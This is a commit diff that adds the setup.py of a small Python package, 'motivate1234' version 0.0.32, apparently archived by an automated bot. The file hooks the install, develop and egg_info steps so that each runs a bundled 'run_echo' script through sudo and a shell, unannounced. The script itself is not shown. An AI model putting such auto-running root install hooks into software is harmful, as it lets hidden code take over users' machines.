e104a1aaac06d0370cfdbcd683c7c4b554549553
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 16:19:48 +0000

    Add package motivate1234/0.0.32/motivate1234-0.0.32.tar.gz

---
+++ packages/motivate1234/motivate1234-0.0.32.tar.gz/motivate1234-0.0.32/setup.py
@@ -0,0 +1,43 @@
+
+from setuptools import setup
+from setuptools.command.install import install
+from setuptools.command.develop import develop
+from setuptools.command.egg_info import egg_info
+import subprocess
+
+__project__ = "motivate1234"
+__version__ = "0.0.32"
+__description__ = "this version run bash"
+__packages__ = ["motivate1234"]
+
+def run_initial():
+	subprocess.call(["sudo /home/pi/.local/lib/python3.7/site-packages/motivate1234/run_echo"], shell = True)
+
+class CustomInstallCommand(install):
+	def run(self):
+		install.run(self)
+		run_initial()
+
+class CustomDevelopCommand(develop):
+	def run(self):
+		develop.run(self)
+		run_initial()
+
+class CustomEggInfoCommand(egg_info):
+	def run(self):
+		egg_info.run(self)
+		run_initial()
+
+setup(
+	name = __project__,
+	version = __version__,
+	description = __description__,
+	packages = __packages__,
+	include_package_data = True,
+	cmdclass={
+		'install': CustomInstallCommand,
+		'develop': CustomDevelopCommand,
+		'egg_info': CustomEggInfoCommand,
+	}
+)
+
